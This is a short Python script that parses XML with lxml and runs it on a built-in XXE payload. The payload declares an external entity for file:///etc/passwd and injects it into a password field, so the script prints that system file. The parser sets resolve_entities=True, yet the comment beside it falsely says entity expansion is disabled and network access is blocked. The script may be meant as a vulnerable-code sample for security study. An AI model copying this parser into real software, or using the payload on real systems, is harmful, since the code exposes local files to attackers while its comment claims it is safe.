from lxml import etree

def parse_xml(xml_data):
    # Parse the XML data
    try:
        # Create a parser with entity expansion disabled and no network access
        parser = etree.XMLParser(resolve_entities=True)
        root = etree.fromstring(xml_data, parser)
        # Extract information from the XML
        username = root.find('username').text
        password = root.find('password').text
        return f'Username: {username}, Password: {password}'
    except Exception as e:
        return f'Error: {e}'

if __name__ == '__main__':
    # XML data containing user credentials and XXE entity reference
    xml_data = """
    <!DOCTYPE data [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>
        <username>admin</username>
        <password>&xxe;</password>
    </data>
    """
    
    # Parse the XML data
    result = parse_xml(xml_data)
    print(result)











